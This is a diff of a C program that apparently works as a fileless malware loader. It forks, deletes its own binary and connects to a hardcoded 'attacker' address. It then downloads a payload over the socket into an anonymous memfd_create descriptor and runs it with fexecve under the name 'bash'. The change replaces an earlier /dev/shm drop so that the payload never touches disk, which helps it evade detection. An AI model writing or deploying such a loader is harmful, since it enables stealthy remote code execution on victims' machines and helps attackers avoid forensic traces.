@@ -6,31 +6,41 @@
 #include <arpa/inet.h>
 #include <sys/mman.h>
 
+
+#define SYSCALL_memfd_create 319
+#define MFD_CLOEXEC 1
 #define BUF_SIZE 1024
 
-int	main(int argc, char *argv[])
+static inline int memfd_create(const char *name, unsigned int flags)         // wrapper for the memfd_create syscall
+{
+	return syscall(SYSCALL_memfd_create, name, flags);
+}
+
+int	main(int argc, char *argv[], char *env[])
 {
 	if(fork() == 0)
 		return (0);
 	unlink(argv[0]);
-	int dropped_file = shm_open("k", O_WRONLY | O_CREAT, 0777);
-	int s, l;
+	pid_t	pid;
+	int	fd;
+	int	s, l;
 	unsigned long addr = 0x0100007f11110002;
 	unsigned char buf[BUF_SIZE];
 
 	char *name[2] = {"bash", NULL};
 
+	// connect to attacker -> download from socket fd and write into fd 'a'
 	s = socket(AF_INET, SOCK_STREAM, 0);
 	connect(s, (struct sockaddr*)&addr, 16);
+	fd = memfd_create("y", MFD_CLOEXEC);
 
 	while (1)
 	{
 		if ((l = recv(s, buf, BUF_SIZE, 0)) <= 0)
 			break;
-		write(dropped_file, buf, l);
+		write(fd, buf, l);
 	}
 	close(s);
-	close(dropped_file);
-	execv("/dev/shm/k", name);
+	fexecve(fd, name, env);
 	return (0);
 }
